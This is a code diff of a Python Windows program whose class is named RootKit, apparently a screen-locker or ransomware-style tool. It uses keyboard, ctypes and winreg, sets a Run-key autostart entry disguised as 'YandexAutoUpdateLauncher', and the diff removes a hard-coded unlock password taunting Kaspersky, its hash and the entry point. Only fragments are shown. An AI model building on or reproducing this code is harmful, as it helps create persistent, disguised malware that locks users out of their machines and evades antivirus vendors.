@@ -1,6 +1,3 @@
-import hashlib
-import os
-import subprocess
 import psutil
 import ctypes
 import sys
@@ -8,12 +5,7 @@ import tkinter
 import keyboard
 import winreg
 
-
-
 from pathlib import Path as PLPath
-
-UNLOCK_PASSWORD = "Fuck, you Kaspersky!"
-UNLOCK_HASH = hashlib.sha256(UNLOCK_PASSWORD.encode()).hexdigest()
 
 WINREG_BRANCH = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 WINREG_DWORD = "YandexAutoUpdateLauncher"
@@ -56,7 +48,3 @@ class RootKit:
     def fix_windows_wp(self):
         # TODO : Kill WallpaperEngine wlpaper64
         pass
-
-
-if __name__ == "__main__":
-    rootkit = RootKit()
